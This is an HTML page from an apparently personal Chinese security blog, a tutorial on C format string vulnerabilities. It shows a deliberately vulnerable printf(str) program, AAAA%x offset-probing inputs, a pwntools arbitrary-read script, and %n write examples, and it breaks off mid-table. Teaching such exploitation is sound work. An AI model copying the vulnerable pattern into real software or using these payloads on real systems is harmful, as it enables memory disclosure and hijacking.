@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>fmtstr | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fmtstr">
+<meta property="og:url" content="http://yoursite.com/2019/04/01/什么是格式化字符串/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_c29273e995e8aaa2c9cc4ae15abd779b.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_c46b7c13523766ac5bc9c78599d3aba4.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_eaebe9ee0e63783ba190b6af20da7f03.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_d928423855be1ec06fca199ca7e9ba9a.png">
+<meta property="og:updated_time" content="2019-04-02T11:02:30.325Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fmtstr">
+<meta name="twitter:description" content="什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，">
+<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Alpaca</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Valar Morghulis</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/categories">分类</a></li>
+                        
+                            <li><a href="/friends">友情链接</a></li>
+                        
+                            <li><a href="/about">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1030595469@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/0xA1paca" title="github">github</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/0xA1paca" title="twitter">twitter</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Reverse/" style="font-size: 13.33px;">Reverse</a> <a href="/tags/code/" style="font-size: 13.33px;">code</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Less Is More</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Alpaca</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Alpaca</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Valar Morghulis</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/categories">分类</a></li>
+                
+                    <li><a href="/friends">友情链接</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1030595469@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/0xA1paca" title="github">github</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/0xA1paca" title="twitter">twitter</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-什么是格式化字符串" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/01/什么是格式化字符串/" class="article-date">
+      <time datetime="2019-03-31T16:00:00.000Z" itemprop="datePublished">2019-04-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      fmtstr
+    </h1>
+  
+
+	  
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="什么是格式化字符串"><a href="#什么是格式化字符串" class="headerlink" title="什么是格式化字符串"></a>什么是格式化字符串</h2><p>学过c语言的都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，<a id="more"></a>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">	printf(&quot;My name is %s&quot;,&quot;xiaoming&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用以后会显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiaoming</span><br></pre></td></tr></table></figure>
+<p>该printf函数的第一个参数就是格式化字符串，它主要是依靠一个用来告诉程序如何进行格式化输出的说明符。在C程序中我们有许多用来格式化字符串的说明符，在这些说明符后面我们可以填充我们的内容。记住，说明符的前缀总是“%”字符，另外说明符存在许多不同的数据类型，最常见的包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>
+<p>在这众多的格式符中出了一个叛徒<code>%n</code>，其他都是用来打印的，而<code>%n</code>可以用来把一个int型的值写到指定的地址中。关于这个格式符的利用在后面再介绍，这里先简单给两个例子。</p>
+<p>在gcc环境下，我们编写如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int c = 0; </span><br><span class="line">	printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">	printf(&quot;%d\n&quot;, c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the use of 11</span><br></pre></td></tr></table></figure>
+<p>在VS上直接用以上代码编译后运行则会出错，原因是微软处于安全考虑默认是禁用了<code>%n</code>，要启用则需要加上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_set_printf_count_output(1);</span><br></pre></td></tr></table></figure>
+<p>具体细节可以参考MSDN：<a href="https://msdn.microsoft.com/zh-cn/library/ms175782.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms175782.aspx</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int c = 0;</span><br><span class="line">	_set_printf_count_output(1);</span><br><span class="line">	printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">	printf(&quot;%d&quot;, c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>我们再看一下再栈中的运行细节。</p>
+<p>示例程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int a = 0x3000;</span><br><span class="line">	char b[10] = &quot;hahaha&quot;;</span><br><span class="line">	int c = 0xFF;</span><br><span class="line">	printf(&quot;output %d,%s,%d&quot;,a,b,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0040150E    C74424 2C 00300&gt;mov dword ptr ss:[esp+0x2C],0x3000</span><br><span class="line">00401516    C74424 1E 68616&gt;mov dword ptr ss:[esp+0x1E],0x61686168</span><br><span class="line">0040151E    C74424 22 68610&gt;mov dword ptr ss:[esp+0x22],0x6168</span><br><span class="line">00401526    66:C74424 26 00&gt;mov word ptr ss:[esp+0x26],0x0</span><br><span class="line">0040152D    C74424 28 FF000&gt;mov dword ptr ss:[esp+0x28],0xFF</span><br><span class="line">00401535    8B4424 28       mov eax,dword ptr ss:[esp+0x28]          ; eax = 0xFF</span><br><span class="line">00401539    894424 0C       mov dword ptr ss:[esp+0xC],eax           ; [0xc] = 0xFF</span><br><span class="line">0040153D    8D4424 1E       lea eax,dword ptr ss:[esp+0x1E]          ; eax = &amp;str_of_hahaha</span><br><span class="line">00401541    894424 08       mov dword ptr ss:[esp+0x8],eax           ; [0x8] = &amp;str_of_hahaha</span><br><span class="line">00401545    8B4424 2C       mov eax,dword ptr ss:[esp+0x2C]          ; eax = 0x3000</span><br><span class="line">00401549    894424 04       mov dword ptr ss:[esp+0x4],eax           ; [0x4] = eax</span><br><span class="line">0040154D    C70424 00404000 mov dword ptr ss:[esp],study.00404000    ; output %d,%s,%d</span><br><span class="line">00401554    E8 CF100000     call &lt;jmp.&amp;msvcrt.printf&gt;</span><br></pre></td></tr></table></figure>
+<p>栈状态：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0060FE80   00404000  |format = &quot;output %d,%s,%d&quot;</span><br><span class="line">0060FE84   00003000  |&lt;%d&gt; = 3000 (12288.)</span><br><span class="line">0060FE88   0060FE9E  |&lt;%s&gt; = &quot;hahaha&quot;</span><br><span class="line">0060FE8C   000000FF  \&lt;%d&gt; = FF (255.)</span><br></pre></td></tr></table></figure>
+<p>上面是内存低址，下面是内存高址，函数的参数的入栈顺序（此处）为从右到左（__cdecl 调用约定）</p>
+<hr>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>产生这个漏洞的原因只有一个，那就是程序员偷懒。</p>
+<p>比如我想让用户输入一个名字，然后再把这个名字原样输出，一般人可能会这么写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br></pre></td></tr></table></figure>
+<p>这个程序没有问题。<br>但总会有一些人为了偷懒会写成这种样子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure>
+<p>这个程序在printf处用了一种偷懒的写法。这看起来是没有什么问题，程序也正常的打印了名字，但是却产生了一个非常严重的漏洞。</p>
+<p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p>
+<p>示例程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	char a[100];</span><br><span class="line">	scanf(&quot;%s&quot;,a);</span><br><span class="line">	printf(a);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设我们的输入为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br></pre></td></tr></table></figure>
+<p>程序的输出为（此次）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825</span><br></pre></td></tr></table></figure>
+<p>注意，这其中有一组为41414141，那就是这个字符串开始的位置。</p>
+<p>看一下栈里的样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0061FE30   0061FE4C  |format = &quot;AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x&quot;</span><br><span class="line">0061FE34   0061FE4C  |&lt;%x&gt; = 0x61FE4C</span><br><span class="line">0061FE38   0061FFCC  |&lt;%x&gt; = 0x61FFCC</span><br><span class="line">0061FE3C   76E4D250  |&lt;%x&gt; = 0x76E4D250</span><br><span class="line">0061FE40   FF12BE58  |&lt;%x&gt; = 0xFF12BE58</span><br><span class="line">0061FE44   FFFFFFFE  |&lt;%x&gt; = 0xFFFFFFFE</span><br><span class="line">0061FE48   76E473DA  |&lt;%x&gt; = 0x76E473DA</span><br><span class="line">0061FE4C   41414141  |&lt;%x&gt; = 0x41414141</span><br><span class="line">0061FE50   252C7825  |&lt;%x&gt; = 0x252C7825</span><br><span class="line">0061FE54   78252C78  |&lt;%x&gt; = 0x78252C78</span><br><span class="line">0061FE58   2C78252C  |&lt;%x&gt; = 0x2C78252C</span><br><span class="line">0061FE5C   252C7825  \&lt;%x&gt; = 0x252C7825</span><br><span class="line">0061FE60   78252C78</span><br><span class="line">0061FE64   2C78252C</span><br><span class="line">0061FE68   252C7825</span><br><span class="line">0061FE6C   78252C78</span><br><span class="line">0061FE70   00000000</span><br><span class="line">0061FE74   00000000</span><br><span class="line">0061FE78   00000000</span><br></pre></td></tr></table></figure>
+<p>0x0061FE4C 是格式化字符串开始的位置，通过不断的取变量操作，最终我们就能读取到程序的每一个位置。</p>
+<hr>
+<h2 id="实现任意地址读"><a href="#实现任意地址读" class="headerlink" title="实现任意地址读"></a>实现任意地址读</h2><p>有了上面的原理，我们来到linux环境。</p>
+<p>任意地址读我们需要用到printf格式化字符串的另外一个特性，”$“操作符。</p>
+<p>这个操作符可以输出指定位置的参数。<br>wikipedia是这样说的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Parameter field</span><br><span class="line">This is a POSIX extension and not in C99. The Parameter field can be omitted or can be:</span><br><span class="line"></span><br><span class="line">n$	</span><br><span class="line"></span><br><span class="line">n is the number of the parameter to display using this format specifier, allowing the parameters provided to be output multiple times, using varying format specifiers or in different orders. If any single placeholder specifies a parameter, all the rest of the placeholders MUST also specify a parameter.</span><br><span class="line"></span><br><span class="line">For example, printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) produces 17 0x11; 16 0x10.</span><br></pre></td></tr></table></figure>
+<p>示例程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	char str[100];</span><br><span class="line">	scanf(&quot;%s&quot;,str);</span><br><span class="line">	printf(str);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先测出字符串开头的偏移量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%1$x</span><br><span class="line">AAAAffa87a68</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%2$x        </span><br><span class="line">AAAAc2</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%3$x</span><br><span class="line">AAAAf766376b</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%4$x</span><br><span class="line">AAAAffb6ad4e</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%5$x</span><br><span class="line">AAAAffab456c</span><br><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">AAAA%6$x    </span><br><span class="line">AAAA41414141</span><br></pre></td></tr></table></figure>
+<p>由此我们测出偏移为6</p>
+<p>然后我们用pwntools编写如下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">cn = process(&apos;str&apos;)</span><br><span class="line">cn.sendline(p32(0x08048000)+&quot;%6$s&quot;)</span><br><span class="line">#cn.sendline(&quot;%7$s&quot;+p32(0x08048000))</span><br><span class="line">print cn.recv()</span><br></pre></td></tr></table></figure>
+<p>执行脚本以后发现 EOFError</p>
+<p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_25972122d772639e8366f946e4e2c8f4.png" alt="img"></a></p>
+<p>因为我们想要读取的地址是0x08048000，根据little-endian，所以我们发送过去的数据包的第一字节是地址的最后一字节，即0x00，所以发送失败。我们可以对payload做如下调整</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.sendline(&quot;%7$s&quot;+p32(0x08048000))</span><br></pre></td></tr></table></figure>
+<p>把6改成7是有原因的，调整前：</p>
+<p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_c29273e995e8aaa2c9cc4ae15abd779b.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_c29273e995e8aaa2c9cc4ae15abd779b.png" alt="img"></a></p>
+<p>调整后：</p>
+<p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_c46b7c13523766ac5bc9c78599d3aba4.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_c46b7c13523766ac5bc9c78599d3aba4.png" alt="img"></a></p>
+<p>通过改进的payload我们成功获取到了elf文件的前几字节。</p>
+<p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_eaebe9ee0e63783ba190b6af20da7f03.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_eaebe9ee0e63783ba190b6af20da7f03.png" alt="img"></a></p>
+<p><a href="http://ordvwjm69.bkt.clouddn.com/fmt_d928423855be1ec06fca199ca7e9ba9a.png" target="_blank" rel="noopener"><img src="http://ordvwjm69.bkt.clouddn.com/fmt_d928423855be1ec06fca199ca7e9ba9a.png" alt="img"></a></p>
+<p>如果这个程序中含有其他漏洞能够是我们控制eip来反复调用printf函数，把整个elf或是libc拖下来都是可以做到的。</p>
+<hr>
+<h2 id="实现任意地址写"><a href="#实现任意地址写" class="headerlink" title="实现任意地址写"></a>实现任意地址写</h2><p>看了任意地址写，肯定感觉不过瘾，毕竟这样我们是能看，不能写入一些非法数据来控制eip。下面就来介绍任意地址写，用到的就是我们上面提到的<code>%n</code>格式符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int c = 0; </span><br><span class="line">	printf(&quot;the use of %n&quot;, &amp;c);</span><br><span class="line">	printf(&quot;%d\n&quot;, c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序，我们把n的值改成11。但作为代价，我们输入了长达11的字符串，如果我们想把n改成100，不总是有这么长的空间让我们存100字节的数据。</p>
+<p>这时我们需要用到格式符的另一点特性，自定义打印字符串的宽度，程序如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc str.c -m32 -o str</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int c = 0; </span><br><span class="line">	printf(&quot;%.100d%n&quot;, c,&amp;c);</span><br><span class="line">	printf(&quot;\nthe value of c: %d\n&quot;, c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到c被修改成了100</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">veritas@ubuntu:~/pwn$ ./str</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">the value of c: 100</span><br></pre></td></tr></table></figure>
+<p>那如果我们想要把指修改成0x12345678呢？难道我们要让他回显0x12345678字节长的字符串回来？并不是，这里提供一份表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span 